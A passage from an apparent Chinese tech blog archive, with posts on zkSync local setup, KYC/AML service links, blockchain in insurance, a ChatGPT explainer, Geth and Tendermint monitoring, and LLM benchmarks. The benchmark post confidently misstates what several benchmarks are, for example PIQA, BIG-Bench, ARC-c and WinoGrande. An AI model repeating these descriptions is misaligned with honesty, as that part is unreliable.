    <content><![CDATA[<p><a href="https://github.com/matter-labs/zksync">zksync</a> 是用于以太坊的、可扩展的、隐私交易的引擎。它目前的功能范围包括以太币（ETH）和ERC20代币的隐私交易。zkSync建立在ZK Rollup架构上。zk Rollup 的本质是将链上的用户状态压缩存储在一棵 hash 树中，并将用户状态的变更转移到链下来，同时通过 zkSNARK 的证明来保证该链下用户状态变更过程的正确性。在链上直接处理用户状态的变更成本是比较高的，但是仅仅利用链上的智能合约来验证一个零知识证明的 PROOF 是否正确，成本是相对低很多的。另外必要的转账信息也会被和证明一起提交到合约，方便用户查账。用户具有存款、转账、取款等动作。通常，资产位于L1之上，经过存款动作即为将资产转移至Rollup L2。位于Rollup L2之上的字长方可转移。</p>
<h4 id="step1-准备工作"><a href="#step1-准备工作" class="headerlink" title="step1 准备工作"></a>step1 准备工作</h4><p><a href="https://github.com/matter-labs/zksync/blob/master/docs/setup-dev.md">https://github.com/matter-labs/zksync/blob/master/docs/setup-dev.md</a></p>
<p>Docker、node（10.20.1以上，版本以10为基准，不建议11 或者12 ）、Yarn、Axel、gnu-sed、Envsubst、Rust、JQ、PSQL、Diesel、solc、drone cli都是必须要安装的。</p>
<p>1.1 环境配置：</p>
<p>讲下面的环境变量加入shell profile，以zsh为例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Add path here:</span></span><br><span class="line">export ZKSYNC_HOME=/path/to/zksync</span><br><span class="line">export PATH=$ZKSYNC_HOME/bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you<span class="string">&#x27;re like me, uncomment:</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> <span class="variable">$ZKSYNC_HOME</span></span></span><br></pre></td></tr></table></figure>

<p><code>ZKSYNC_HOME</code> 是zksync项目的目录即可，例如<code>/home/will/documents/zksync/</code> 。</p>
<p>1.2 zshrc 配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;fpath=(~/.zsh_comp $fpath)&quot; &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line">mkdir -p ~/.zsh_comp</span><br></pre></td></tr></table></figure>

<p>1.3 制作命令文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">compdef zksync</span></span><br><span class="line"></span><br><span class="line">cmds=( $&#123;(uf)&quot;$(grep -oE &#x27;^[a-zA-Z0-9_.-]+:([^=]|$)&#x27; $ZKSYNC_HOME/Makefile | sed &#x27;s/[^a-zA-Z0-9_.-]*$//&#x27;)&quot;&#125; )</span><br><span class="line"></span><br><span class="line">_describe &#x27;zksync make cmds&#x27; cmds</span><br></pre></td></tr></table></figure>

<p>1.4 <code>source </code> zshrc 文件后，zksync命令即可用。</p>
<h4 id="step2-zksync设置本地开发环境"><a href="#step2-zksync设置本地开发环境" class="headerlink" title="step2 zksync设置本地开发环境"></a>step2 zksync设置本地开发环境</h4><p>2.1 初始化</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zksync init</span><br></pre></td></tr></table></figure>

<p>首次初始化需要一次性下载 8 GB 的配置文件。如遇到初始化问题，请参看<code>zksync plonk-setup</code> 命令。本人网速580KB/s的情况下，接近4个小时完成下载。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>公有链中资产合规化的研究</title>
    <url>/2022/03/03/%E5%85%AC%E6%9C%89%E9%93%BE%E4%B8%AD%E8%B5%84%E4%BA%A7%E5%90%88%E8%A7%84%E5%8C%96%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h3 id="KYC-amp-AML"><a href="#KYC-amp-AML" class="headerlink" title="KYC &amp; AML"></a>KYC &amp; AML</h3><ul>
<li><p><a href="https://www.chainalysis.com/chainalysis-kyt/">https://www.chainalysis.com/chainalysis-kyt/</a></p>
</li>
<li><p><a href="https://www.jumio.com/">https://www.jumio.com/</a></p>
</li>
<li><p><a href="https://www.palantir.com/offerings/anti-money-laundering/">https://www.palantir.com/offerings/anti-money-laundering/</a></p>
</li>
<li><p><a href="https://www.fireblocks.com/platforms/aml-compliance/">https://www.fireblocks.com/platforms/aml-compliance/</a></p>
</li>
<li><p><a href="https://www.trmlabs.com/">https://www.trmlabs.com/</a></p>
</li>
</ul>
<h3 id="KYC"><a href="#KYC" class="headerlink" title="KYC"></a>KYC</h3><ul>
<li><a href="https://withpersona.com/">https://withpersona.com/</a></li>
<li><a href="https://onfido.com/">https://onfido.com/</a></li>
</ul>
<p>考虑到数据覆盖率，金融机构会选择2-3家合规机构同时使用。</p>
<h3 id="more-traditional-DeFi-mandatory-KYC"><a href="#more-traditional-DeFi-mandatory-KYC" class="headerlink" title="more traditional DeFi (mandatory KYC)"></a>more traditional DeFi (mandatory KYC)</h3><ul>
<li><a href="https://www.gemini.com/">https://www.gemini.com/</a></li>
<li><a href="https://blockfi.com/">https://blockfi.com/</a></li>
<li><a href="https://nexo.io/">https://nexo.io/</a> ==&gt; by KYC &amp; AML on <a href="https://www.jumio.com/">https://www.jumio.com/</a></li>
</ul>
<h3 id="high-yield-DeFi-less-or-no-KYC"><a href="#high-yield-DeFi-less-or-no-KYC" class="headerlink" title="high yield DeFi (less or no KYC)"></a>high yield DeFi (less or no KYC)</h3><ul>
<li><a href="https://www.donut.app/">https://www.donut.app/</a></li>
<li><a href="https://www.getlinus.io/">https://www.getlinus.io/</a></li>
<li><a href="https://outlet.finance/">https://outlet.finance/</a></li>
<li><a href="https://www.youhodler.com/">https://www.youhodler.com/</a></li>
<li><a href="https://ledn.io/">https://ledn.io/</a></li>
</ul>
]]></content>
      <tags>
        <tag>数字资产</tag>
      </tags>
  </entry>
  <entry>
    <title>保险行业区块链应用研究</title>
    <url>/2019/03/26/%E4%BF%9D%E9%99%A9%E8%A1%8C%E4%B8%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p><a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/Y2019/V5/I3/207">Research on Blockchain Application in Insurance Industry</a></p>
<p>全文: <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/abstract/abstract563.shtml#">PDF</a> (4379 KB)   <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/abstract/abstract563.shtml#">HTML</a> (1 KB) </p>
<p>输出: <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/article/getTxtFile.do?fileType=BibTeX&id=563">BibTeX</a> | <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/article/getTxtFile.do?fileType=EndNote&id=563">EndNote</a> (RIS)      </p>
<table>
<thead>
<tr>
<th align="left">Abstract：Blockchain technology will play an important role in digital transformation in insurance industry. This paper attempts to introduce CBGM (Consortium Blockchain Governance Model) which can help insurance institutions to leverage blockchain technology to build insurance digital ecosystem more efficiently. This paper leverages authors experience of applying blockchain technology in insurance industry recent years. Firstly, application scenarios of blockchain in insurance industry has been sorted out. Meanwhile, the challenges of using blockchain technology has been analyzed, whose one of the key challenges is how to manage consortium. Secondly, CBGM and 6 sub-modules have been developed and introduced which is targeted to provide common method to manage consortium. Finally, an example of using CBGM has been shared and proposal for insurance institution has been provided.</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Key words： <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/abstract/abstract563.shtml#">blockchain</a>       <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/abstract/abstract563.shtml#">insurance</a>       <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/abstract/abstract563.shtml#">consortium</a>       <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/abstract/abstract563.shtml#">governance model</a>       <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/abstract/abstract563.shtml#">project implementation</a></td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>paper</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ChatGPT学习生成式AI的原理</title>
    <url>/2023/02/14/%E5%85%B3%E4%BA%8EChatGPT%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%88%90%E5%BC%8FAI%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h3 id="生成式AI的创新之处"><a href="#生成式AI的创新之处" class="headerlink" title="生成式AI的创新之处"></a>生成式AI的创新之处</h3><p>近期以ChatGPT为代表的“生成式AI”（Generative AI）技术得到了广泛关注。**和传统的对话机器人（Chatbot）不同，OpenAI的ChatGPT确实有独特的技术创新，在人工智能的发展史上会是一个里程碑，甚至有可能和2016年谷歌的AIphaGo相提并论。目前的趋势显示，ChatGPT的应用前景比AlphaGo更广泛，更有潜力在推动这股AI技术潮流的发展方面发挥重要作用。</p>
<p><img src="/2023/02/14/%E5%85%B3%E4%BA%8EChatGPT%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%88%90%E5%BC%8FAI%E7%9A%84%E5%8E%9F%E7%90%86/1.png"></p>
<h3 id="首先来学习对话机器人的工作机理"><a href="#首先来学习对话机器人的工作机理" class="headerlink" title="首先来学习对话机器人的工作机理"></a>首先来学习对话机器人的工作机理</h3><p>首先用户需要通过文字或语音向对话机器人输入一段信息，紧接着机器人会识别并理解这段信息，判断由该信息开启的对话任务，并给出相应的回复内容。最早期的对话机器人更像一个基于数据库或者知识库的查询系统，根据用户输入的信息查询到对应的答复。可以说这些答案基于不同的索引（index），已经事先存入对话机器人的数据库或者知识库，就跟搜索引擎使用的算法很类似。当对话机器人收到用户输入的信息以后，主要工作是处理信息中的关键词来生成最匹配的索引，再基于一定规则找到最匹配的答复。后来发展的对话机器人也可以利用训练数据，通过机器学习来产生答复，比如2014年的深度学习模型Seq2Seq被成功地用到了对话机器人上面。这些机器学习模型最喜欢的训练数据就是事先采集和标注好的在相同场景下（比如智能客服）的对话记录。</p>
<h4 id="1-早期最有影响力的生成式AI技术是2014年发明的生成式对抗网络（Generative-Adversarial-Networks）"><a href="#1-早期最有影响力的生成式AI技术是2014年发明的生成式对抗网络（Generative-Adversarial-Networks）" class="headerlink" title="1.早期最有影响力的生成式AI技术是2014年发明的生成式对抗网络（Generative Adversarial Networks）"></a>1.早期最有影响力的生成式AI技术是2014年发明的生成式对抗网络（Generative Adversarial Networks）</h4><p><strong>其本质是一种深度学习模型，原理上有两个神经网络相互对立，一个生成器和一个判别器。</strong>生成器或生成网络负责生成类似于源数据的新数据或内容，判别器或判别网络负责评价源数据和生成数据之间的区别并向生成器提供反馈。生成式对抗网络被成功用于计算机视觉技术，比如图像的生成和合成，但是在对话机器人技术上的成功应用并不多。</p>
<h4 id="2-ChatGPT的核心是2017年出现的新生成式AI技术Transformer和随后产生的基于Transformer的大规模预训练技术，并引入了一些新的强化学习算法"><a href="#2-ChatGPT的核心是2017年出现的新生成式AI技术Transformer和随后产生的基于Transformer的大规模预训练技术，并引入了一些新的强化学习算法" class="headerlink" title="2.ChatGPT的核心是2017年出现的新生成式AI技术Transformer和随后产生的基于Transformer的大规模预训练技术，并引入了一些新的强化学习算法"></a>2.ChatGPT的核心是2017年出现的新生成式AI技术Transformer和随后产生的基于Transformer的大规模预训练技术，并引入了一些新的强化学习算法</h4><p><strong>其中的核心技术Transformer是2017年谷歌发明的，它来源于2017年谷歌的一篇<a href="https://willzhuang.github.io/2023/01/16/Transformer%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/">科研论文《Attention Is All Your Need》</a>。</strong>原本这篇论文聚焦的是自然语言处理领域，但由于其出色的解释性和计算性能，Transformer开始被广泛使用在AI各个领域和不同数据类型，成为最近几年最流行的AI算法模型。</p>
<h4 id="3-Transformer的另一个巨大贡献是产生了预训练语言模型，比如GPT、BERT和ERNIE等"><a href="#3-Transformer的另一个巨大贡献是产生了预训练语言模型，比如GPT、BERT和ERNIE等" class="headerlink" title="3.Transformer的另一个巨大贡献是产生了预训练语言模型，比如GPT、BERT和ERNIE等"></a>3.Transformer的另一个巨大贡献是产生了预训练语言模型，比如GPT、BERT和ERNIE等</h4><p>这些预训练语言模型用到的对语言的编码器和解码器，都是由一个个的Transformer组件拼接在一起形成的。比如，预训练语言模型BERT 所做的就是从大规模上亿的无标注文本语料中，随机抠掉一部分单词，形成类似完形填空的题型，不断学习空格处到底该填写什么。BERT的训练是从大量无标注数据中学习复杂的上下文联系。BERT和GPT（Generative Pre-Training）最主要的区别在于，BERT仅仅使用编码器部分进行模型训练，GPT仅仅使用解码器部分，所以GPT更适用于生成文本。</p>
<p><strong>总的来说，预训练的第一步是在大规模无标注数据（如网上文本）上进行模型预训练，学习通用的语言模式；第二步在给定自然语言处理任务的小规模有标注数据上进行模型微调，快速提升模型完成这些任务的能力，最终形成可部署应用的模型**</strong>。**预训练模型已经在大规模语料上训练好了参数，用户在用的时候只需要在这个基础上训练更新参数。用户可以在神经网络加的最后的一层上进行分类或者更多的语言推理任务（比如对话等）。预训练技术成功激活了深度神经网络对大规模无标注数据的自监督学习能力，而Transformer和基于它的GPT、BERT、ERNIE等模型奠定了自然语言处理领域大模型的基础，证明了通过大规模语料的预训练技术，能够大幅度提升各类文本阅读理解的效果，开启了自然语言处理的新时代。</p>
<p>从Transformer提出到“大规模预训练模型”GPT和BERT的诞生，再到GPT-2的迭代，以及到GPT-3和ChatGPT的出现，标志着OpenAI成为营利性公司。<strong>ChatGPT可以说是OpenAI公司利用最新生成式AI技术（Transformer）和最新大规模预训练模型（GPT-3.5）在对话机器人上的成功应用。</strong>GPT-3的模型所采用的数据量多达上万亿，主要使用的是公共爬虫数据集和有着超过万亿单词的人类语言数据集，对应的模型参数量也达到1,750亿。另外，ChatGPT还采用了新的强化学习算法RLHF（Reinforcement Learning from Human Feedback，从人类反馈中强化学习）来对模型进行训练，具体是让一些外包人员不断从模型的输出结果中筛选，判断哪些句子是好的，哪些是低质量的，这样就可以训练得到一个强化学习中的奖励（reward）模型。</p>
<p><strong>ChatGPT属于现象级应用，大家都可以有直观感受，未来这类应用的体验提升和更新速度只会更快，理解其背后的技术有助于我们把握这个趋势。</strong>从大量用户在网上分享的反馈来看，与同类对话机器人相比，ChatGPT具有几个明显的优点：</p>
<ul>
<li><p><strong>更有“对话”的感觉：</strong>ChatGPT在语言组织的逻辑性和系统性方面有了显著提高，感觉像是一个助理，甚至是老师在回答问题。</p>
</li>
<li><p><strong>回答理性又全面：</strong>不像网上搜索问题那样，很可能碰到一些固执的回答者，只站在一个角度回答问题，ChatGPT能做到多角度全方位回答。</p>
</li>
<li><p><strong>可以理解上下文：</strong>例如，在提出一个问题之后，可以用“就刚才的回答中，你指的xx到底是什么意思？”等形式，进行追问。</p>
</li>
<li><p><strong>会根据用户的反馈，持续优化模型：</strong>ChatGPT答案的质量、完整性每天都有一定提高。这是新的强化学习算法和几十名外包人员每天筛选答案的贡献。</p>
</li>
<li><p><strong>可以协助创作内容，甚至对计算机代码进行指导：</strong>注意，ChatGPT并不是简单地从某个模版中选择内容，而是根据实时计算的结果提供答案。你给的信息越精准，回复就越有针对性。</p>
</li>
</ul>
<h3 id="ChatGPT还不能做什么"><a href="#ChatGPT还不能做什么" class="headerlink" title="ChatGPT还不能做什么"></a>ChatGPT还不能做什么</h3><p><strong>ChatGPT提供的答案只能被认为是不保证100%可靠的建议。</strong>因为ChatGPT是基于大规模预训练这样的无监督学习，我们无法分辨预训练信息的来源和真实性。ChatGPT给出答案的精确度取决于预训练样本规模（目前预训练样本只限2021年之前的数据）和样本本身的准确度。所以很明显，ChatGPT并没有连接一个稳妥可靠的知识库，这也说明目前这个版本无法完全替代搜索引擎，而更适用于一些务虚的任务，比如写小说、写诗歌、搞辩论。<strong>我们认为给ChatGPT连接一个高质量的知识库会极大提高ChatGPT的准确性。一个可以考虑的方向是，让ChatGPT能够持续更新知识、查询知识，从而带领搜索引擎和互联网的发展。目前看来，至少ChatGPT可以做到将搜索引擎上的信息润色、组织成最适合人阅读的形式，直接反馈给用户。</strong></p>
<h3 id="预见未来"><a href="#预见未来" class="headerlink" title="预见未来"></a>预见未来</h3><p><strong>直接应用生成式AI（Generative AI ）的场景是人机互动的文本、图像、语音、视频，也可以生成软件代码、音乐、虚拟世界的三维模型等，在消费领域可以用来做艺术创作、游戏开发、人员陪护等，它为商业领域里也带来很多数字化创新的机会。</strong></p>
<p>企业级解决方案的创新是用户界面的变化，采用自然语言进行交互。无论是交易型应用还是分析型应用，基于AI采用自然语言进行互动的方式早有所探索，例如企业级商业智能可以采用持续的自然语言问答进行数据查询，并自动生成自然语言回答或者直观的图表；利用生成式AI可以进一步提升用户界面生成效率和质量。</p>
<p>聊天机器人在很多业务场景下并不能完全替代人工，这种方式不仅存在AI准确性的问题，而且在用户体验上缺乏沟通的温度，然而，AI具有超越人脑的信息处理能力，可以提供辅助人员互动的智慧，支持人与人之间有温度的沟通。不仅具有前文所述的行动计划推荐能力，而且能够实时分析销售人员的行为和话术，提出有针对性的辅导、改进建议，提升销售成功率，生成式AI进一步提升了此类智能化辅助程度。</p>
<p>可以预见，企业数字化应用可能会有以下变化：</p>
<ol>
<li><strong>实现业务流程的全自动导航，</strong>例如，根据用户反馈，通过生成式AI自动改进产品设计，这将改变传统的产品开发相关企业软件（例如PLM、CAD）的应用流程。</li>
<li><strong>2B软件架构简化，强调前端开发，进一步实现“数字技术民主化”，降低工作中对数据、信息和知识的访问门槛，用户能够更好地使用数字化技术和AI。</strong>传统企业软件架构是应用软件访问集中的数据库，需要用代码来连接用户请求和数据，而未来数据和算法都是服务，利用生成式AI产生代码的过程将极为简化，企业软件将完全聚焦于业务运营和用户体验的持续创新。</li>
<li>下一步，如果AI还具备了，推理，推演，演绎的能力，例如回答：明天我要去见哪个客户会更有助于达成我这个月的销售指标？用什么手段能降低5%的费用而不影响员工满意度？那么AI将会觉有更加深远的影响。</li>
</ol>
<p><strong>生成式AI还将改变企业软件行业的商业生态——AI算法和工程等技术平台的开源社区蓬勃发展，利用开源技术开发基础模型越来越普遍。然而，体现企业差异化能力的是喂给AI的原料，所以数据资源的价值将更为凸显，具有独特know-how和来源的数据将成为AI背后的能力。</strong></p>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Geth监控</title>
    <url>/2019/12/20/%E5%85%B3%E4%BA%8EGeth%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<p>go-ethereum 在 2019 年 7 月推出了 <code>Geth v1.9.x</code> 版本。</p>
<p>Geth 可以通过 <code>--metrics</code> 命令符收集运行状态信息。 <code>Geth v1.9.x</code> 有3套独立的监控体系，<a href="https://golang.org/pkg/expvar/">ExpVars</a>，<a href="https://www.influxdata.com/products/influxdb-overview/">InfluxDB</a> 和 <a href="https://prometheus.io/">Prometheus</a>：</p>
<ol>
<li><h3 id="ExpVars"><a href="#ExpVars" class="headerlink" title="ExpVars"></a><a href="https://golang.org/pkg/expvar/">ExpVars</a></h3></li>
</ol>
<p>是将Golang系统公共指标暴露给到HTTP接口。Geth 用 <code>pprof</code> 来作为埋点暴露这些公共参数。</p>
<p>运行 Geth –metrics –pprof 将暴露指标成为<a href="https://golang.org/pkg/expvar/">ExpVars</a>的格式，于地址 </p>
<p><a href="http://127.0.0.1:6060/debug/metrics%E3%80%82">http://127.0.0.1:6060/debug/metrics。</a></p>
<p>ExpVars 有 Golang 非常好的支持。</p>
<ol start="2">
<li><h3 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a><a href="https://prometheus.io/">Prometheus</a></h3></li>
</ol>
<p>同理 ExpVars，运行 Geth –metrics –pprof 将暴露指标成为<a href="https://prometheus.io/">Prometheus</a>的格式，于地址 </p>
<p><a href="http://127.0.0.1:6060/debug/metrics/prometheus%E3%80%82">http://127.0.0.1:6060/debug/metrics/prometheus。</a></p>
<p><a href="https://prometheus.io/">Prometheus</a>更加接近业界的标准。</p>
<ol start="3">
<li><h3 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a><a href="https://www.influxdata.com/products/influxdb-overview/">InfluxDB</a></h3></li>
</ol>
<p><a href="https://golang.org/pkg/expvar/">ExpVars</a> 和 <a href="https://prometheus.io/">Prometheus</a> 是拉取pull数据的监控方式。<a href="https://www.influxdata.com/products/influxdb-overview/">InfluxDB</a> 是推送push数据的监控方式。</p>
<p><a href="https://www.influxdata.com/products/influxdb-overview/">InfluxDB</a>的启用有些麻烦，请参见 <code>geth help</code> 中的 <code>--metrics.influxdb</code> 及其子标识。</p>
<h3 id="参数可视化"><a href="#参数可视化" class="headerlink" title="参数可视化"></a>参数可视化</h3><p>推荐使用 <a href="https://grafana.com/">Grafana</a>，建议使用 <a href="http://127.0.0.1:6060/debug/metrics">geth-prometheus</a> 项目中给出的图表，参考链接==&gt; <a href="https://github.com/karalabe/geth-prometheus">https://github.com/karalabe/geth-prometheus</a>。效果如下图：</p>
<p><img src="/2019/12/20/%E5%85%B3%E4%BA%8EGeth%E7%9B%91%E6%8E%A7/1.jpg"></p>
<p>参考文档==&gt; <a href="https://blog.ethereum.org/2019/07/10/geth-v1-9-0/">Geth v1.9.0 Six months distilled</a></p>
<p>具体功能如下：</p>
<ul>
<li>节点进程监控<ul>
<li>节点的存活，进程中CPU、内存使用率，IO</li>
</ul>
</li>
<li>区块链数据健康监控<ul>
<li>节点出块高度历史，出块时间，出块间隔趋势，交易量历史，TPS，磁盘占用，数据目录大小增长趋势</li>
</ul>
</li>
<li>运行环境监控<ul>
<li>主机运行环境的系统负载、CPU、内存、磁盘空间使用情况、网络流量、TCP 连接数等</li>
</ul>
</li>
<li>故障告警通知<ul>
<li>监控告警策略</li>
<li>支持邮件通知、短信通知</li>
</ul>
</li>
<li>节点网络监控<ul>
<li>连接节点数、网络拓扑、地理位置等</li>
</ul>
</li>
</ul>
<p>仪表板的监控指标：</p>
<ul>
<li>Summary Dashboard<ul>
<li>各节点最新块高</li>
<li>各节点监控进程存活</li>
<li>各节点 CPU 使用率变化</li>
<li>节点列表</li>
</ul>
</li>
<li>Node Info Dashboard<ul>
<li>Chain Meta Data - 链的配置信息，如 Chain Name、创建时间等</li>
<li>Chain Info - 链的最新块高、共识节点数、共识节点出块历史趋势</li>
<li>Node Info - 选定节点的详细信息，包括区块链数据、运行环境、运行软件信息</li>
</ul>
</li>
<li>Host Info Dashboard<ul>
<li>各节点运行主机的信息，包括系统负载、CPU、内存、硬盘使用率、网络流量</li>
</ul>
</li>
<li>Process Info Dashboard<ul>
<li>节点中进程（pprof）的历史情况、CPU、内存、IO 变化历史</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>关于AI-LLM测评</title>
    <url>/2024/05/23/%E5%85%B3%E4%BA%8EAI-LLM%E6%B5%8B%E8%AF%84/</url>
    <content><![CDATA[<p>根据Google Gemini团队的论文 - <a href="https://arxiv.org/pdf/2312.11805">https://arxiv.org/pdf/2312.11805</a> (page 8)来看，测评涵盖了：</p>
<ol>
<li><strong>MMLU (Massive Multitask Language Understanding)</strong>: 这是一个综合性的基准测试，用于衡量模型在多任务语言理解方面的能力。它包含了多个子任务，涉及不同的领域和语言，旨在全面评估模型的语言处理能力。</li>
<li><strong>GSM8K (Grade-school Math 8K)</strong>: 这是一个数学问题解答的数据集，包含了小学级别的数学问题。它用于测试模型解决基础数学问题的能力。</li>
<li><strong>MATH</strong>: 这个术语可能指的是一个更广泛的数学问题解答数据集，它可能包含了不同难度级别的数学问题，用于评估模型的数学推理和解答能力。</li>
<li><strong>BIG-Bench-Hard</strong>: 这是BIG-Bench（Broad Institute General Language Benchmark）的一个子集，包含了更难的任务。BIG-Bench是一个用于评估语言模型在广泛任务上性能的基准测试。</li>
<li><strong>HumanEval</strong>: 这是一个用于评估模型在特定任务上性能的基准测试，通常与人类的表现进行比较。它可能包含了多种类型的任务，如编程任务或自然语言生成任务。</li>
<li><strong>Natural2Code</strong>: 这是一个评估模型将自然语言转换为代码能力的数据集。它用于测试模型在编程语言理解和代码生成方面的能力。</li>
<li><strong>DROP (Discrete Reasoning Over Paragraphs)</strong>: 这是一个阅读理解和推理的数据集，要求模型对段落进行推理并解决基于段落内容的问题。</li>
<li><strong>HellaSwag</strong>: 这是一个用于评估模型在多步推理和情境理解方面能力的基准测试。它包含了多个情境，模型需要根据给定的故事线索选择合适的结局。</li>
<li><strong>WMT23</strong>: 这是Workshop on Machine Translation（机器翻译研讨会）2023年的缩写，它是一个专注于机器翻译领域的国际会议，通常包含最新的研究成果和技术进展。WMT也组织机器翻译系统的评估和竞争，WMT23可能指的是该年会议中使用的机器翻译基准测试。<br>改论文中，还有更多的测试数据集。</li>
</ol>
<p>根据 <a href="https://gpt4all.io/index.html">https://gpt4all.io/index.html</a> 来看，测评涵盖了：</p>
<ol>
<li><strong>BoolQ</strong>: BoolQ（Boolean Questions）是一个数据集，专门用于评估模型理解自然语言中是/否问题的能力。它要求模型不仅要回答问题，还要判断问题是否是布尔类型（即答案为真或假）。</li>
<li><strong>PIQA</strong>: PIQA（Paraphrased Image Question Answering）是一个图像问答数据集，它要求模型对图像内容进行理解，并回答有关图像的问题，这些问题是以释义或改写的形式提出的。</li>
<li><strong>HellaSwag</strong>: HellaSwag是一个多步推理和常识问答的数据集，它包含了一系列的情境，模型需要根据给定的故事线索选择合适的结局。这个数据集旨在测试模型的推理能力和对常识的掌握。</li>
<li><strong>WinoGrande</strong>: WinoGrande是一个大规模的、多样化的、高质量的问答数据集，它包含了大量的问题和答案对，用于评估模型在开放域问答任务上的性能。</li>
<li><strong>ARC-e</strong>: ARC-e（AI2 Reasoning Challenge - Elementary）是一个评估模型在一系列考试类型问题上的表现的基准测试。它旨在测试模型的知识和推理能力。</li>
<li><strong>ARC-c</strong>: ARC-c（AI2 Reasoning Challenge - Complex）是ARC-e的进阶版本，包含了更复杂的推理挑战，需要模型具备更高级的推理技巧。</li>
<li><strong>OBQA</strong>: OBQA（Open-Book Question Answering）是一个问答任务，其中模型在回答问题时可以访问给定的文本或书籍。这个任务测试模型的理解和推理能力，同时考虑到它可以访问额外的信息源。</li>
</ol>
<p>由此看来，<a href="https://www.baichuan-ai.com/home%EF%BC%8C%E7%9B%AE%E5%89%8D%E7%BB%99%E5%87%BA%E7%9A%84%E6%B5%8B%E8%AF%84%E7%BB%93%E6%9E%9C%E6%9D%A5%E7%9C%8B%EF%BC%8C%E8%BF%98%E9%9C%80%E8%A6%81%E7%BB%A7%E7%BB%AD%E5%8A%AA%E5%8A%9B%E3%80%82">https://www.baichuan-ai.com/home，目前给出的测评结果来看，还需要继续努力。</a><br><img src="/2024/05/23/%E5%85%B3%E4%BA%8EAI-LLM%E6%B5%8B%E8%AF%84/1.png"><br>不仅是分数上，而且在测试的范围上，都有相当大的差距存在。</p>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>关于PBFT监控</title>
    <url>/2019/12/20/%E5%85%B3%E4%BA%8EPBFT%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<p>关于PBFT的监控，已tendermint为例，已经具备 <a href="https://prometheus.io/">Prometheus</a> 监控能力。</p>
<p><img src="/2019/12/20/%E5%85%B3%E4%BA%8EPBFT%E7%9B%91%E6%8E%A7/1.jpg"></p>
<p>具体参数请参见 ==&gt; <a href="https://docs.tendermint.com/master/tendermint-core/metrics.html">https://docs.tendermint.com/master/tendermint-core/metrics.html</a></p>
<h2 id="List-of-available-metrics"><a href="#List-of-available-metrics" class="headerlink" title="List of available metrics"></a>List of available metrics</h2><p>The following metrics are available:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Type</strong></th>
<th><strong>Since</strong></th>
<th><strong>Tags</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>consensus_height</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Height of the chain</td>
</tr>
<tr>
<td>consensus_validators</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Number of validators</td>
</tr>
<tr>
<td>consensus_validators_power</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Total voting power of all validators</td>
</tr>
<tr>
<td>consensus_validator_power</td>
<td>Gauge</td>
<td>0.33.0</td>
<td></td>
<td>Voting power of the node if in the validator set</td>
</tr>
<tr>
<td>consensus_validator_last_signed_height</td>
<td>Gauge</td>
<td>0.33.0</td>
<td></td>
<td>Last height the node signed a block, if the node is a validator</td>
</tr>
<tr>
<td>consensus_validator_missed_blocks</td>
<td>Gauge</td>
<td>0.33.0</td>
<td></td>
<td>Total amount of blocks missed for the node, if the node is a validator</td>
</tr>
<tr>
<td>consensus_missing_validators</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Number of validators who did not sign</td>
</tr>
<tr>
<td>consensus_missing_validators_power</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Total voting power of the missing validators</td>
</tr>
<tr>
<td>consensus_byzantine_validators</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Number of validators who tried to double sign</td>
</tr>
<tr>
<td>consensus_byzantine_validators_power</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Total voting power of the byzantine validators</td>
</tr>
<tr>
<td>consensus_block_interval_seconds</td>
<td>Histogram</td>
<td>0.21.0</td>
<td></td>
<td>Time between this and last block (Block.Header.Time) in seconds</td>
</tr>
<tr>
<td>consensus_rounds</td>
<td>Gauge</td>
<td>0.21.0</td>
<td></td>
<td>Number of rounds</td>
</tr>
<tr>
<td>consensus_num_txs</td>
<td>Gauge</td>
<td>0.21.0</td>
